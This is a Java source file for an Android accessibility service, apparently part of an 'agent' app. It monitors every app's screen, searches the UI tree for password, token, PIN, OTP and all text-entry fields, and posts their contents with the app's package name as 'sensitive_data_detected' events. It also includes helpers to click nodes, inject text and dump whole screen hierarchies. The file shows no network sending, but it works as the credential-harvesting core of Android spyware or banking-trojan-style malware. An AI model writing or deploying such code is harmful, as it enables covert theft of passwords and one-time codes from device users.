package com.nexus.agent.services;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.annotation.NonNull;
import com.nexus.agent.models.UIEvent;
import com.nexus.agent.utils.EventBusManager;
import com.nexus.agent.utils.Logger;
import java.util.ArrayList;
import java.util.List;

public class NexusAccessibilityService extends AccessibilityService {
    private static final String TAG = "NexusAccessibility";
    private UIAnalysisService uiAnalysisService;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Logger.d(TAG, "Accessibility Service Connected");
        uiAnalysisService = new UIAnalysisService(this);
        EventBusManager.getInstance().postEvent("accessibility_connected", true);
    }

    @Override
    public void onAccessibilityEvent(@NonNull AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName().toString();
            String className = event.getClassName().toString();
            int eventType = event.getEventType();

            Logger.d(TAG, "Event: " + className + " Type: " + eventType);

            // Post UI event
            UIEvent uiEvent = new UIEvent();
            uiEvent.setPackageName(packageName);
            uiEvent.setClassName(className);
            uiEvent.setEventType(eventType);
            uiEvent.setText(extractText(event));
            uiEvent.setTimestamp(System.currentTimeMillis());

            EventBusManager.getInstance().postEvent("ui_event", uiEvent);

            // Analyze UI for sensitive data
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                analyzeNodeForSensitiveData(rootNode, packageName);
            }

        } catch (Exception e) {
            Logger.e(TAG, "Error processing accessibility event", e);
        }
    }

    @Override
    public void onInterrupt() {
        Logger.w(TAG, "Accessibility Service Interrupted");
    }

    /**
     * Analyze node hierarchy for sensitive data (tokens, passwords, etc)
     */
    private void analyzeNodeForSensitiveData(AccessibilityNodeInfo node, String packageName) {
        try {
            List<AccessibilityNodeInfo> sensitiveNodes = new ArrayList<>();
            findSensitiveNodes(node, sensitiveNodes);

            for (AccessibilityNodeInfo sensitiveNode : sensitiveNodes) {
                String content = sensitiveNode.getText() != null 
                    ? sensitiveNode.getText().toString() 
                    : "";
                String hint = sensitiveNode.getHint() != null 
                    ? sensitiveNode.getHint().toString() 
                    : "";

                if (!content.isEmpty() || !hint.isEmpty()) {
                    Logger.d(TAG, "Sensitive data found: " + hint);
                    EventBusManager.getInstance().postEvent("sensitive_data_detected", 
                        new Object[]{packageName, hint, content});
                }
            }
        } catch (Exception e) {
            Logger.e(TAG, "Error analyzing sensitive data", e);
        }
    }

    /**
     * Find nodes that likely contain sensitive data
     */
    private void findSensitiveNodes(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> results) {
        if (node == null) return;

        String hint = node.getHint() != null ? node.getHint().toString().toLowerCase() : "";
        String className = node.getClassName() != null ? node.getClassName().toString() : "";

        // Check for password fields, token inputs, etc
        if (hint.contains("password") || hint.contains("token") || 
            hint.contains("pin") || hint.contains("otp") ||
            className.contains("EditText")) {
            results.add(node);
        }

        // Recursively check children
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findSensitiveNodes(child, results);
                child.recycle();
            }
        }
    }

    /**
     * Extract text from accessibility event
     */
    private String extractText(AccessibilityEvent event) {
        StringBuilder text = new StringBuilder();
        if (event.getText() != null) {
            for (CharSequence cs : event.getText()) {
                text.append(cs);
            }
        }
        return text.toString();
    }

    /**
     * Simulate click on a node
     */
    public boolean clickNode(AccessibilityNodeInfo node) {
        if (node != null && node.isClickable()) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        return false;
    }

    /**
     * Set text in a node
     */
    public boolean setNodeText(AccessibilityNodeInfo node, String text) {
        if (node != null && node.isEditable()) {
            try {
                node.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
                node.performAction(AccessibilityNodeInfo.ACTION_SELECT_ALL);
                return sendInputEvent(text);
            } catch (Exception e) {
                Logger.e(TAG, "Error setting node text", e);
            }
        }
        return false;
    }

    /**
     * Send input to focused field (requires IME)
     */
    private boolean sendInputEvent(String text) {
        // This would integrate with IME or direct input methods
        // Implementation depends on Android version and root access
        return false;
    }

    /**
     * Get UI tree as hierarchical structure
     */
    public String getUIHierarchy() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return "";

        StringBuilder hierarchy = new StringBuilder();
        buildHierarchy(rootNode, hierarchy, 0);
        return hierarchy.toString();
    }

    private void buildHierarchy(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
        if (node == null) return;

        String indent = "  ".repeat(depth);
        String text = node.getText() != null ? node.getText().toString() : "";
        String className = node.getClassName() != null ? node.getClassName().toString() : "";

        sb.append(indent).append(className).append(" [").append(text).append("]\n");

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                buildHierarchy(child, sb, depth + 1);
                child.recycle();
            }
        }
    }
}
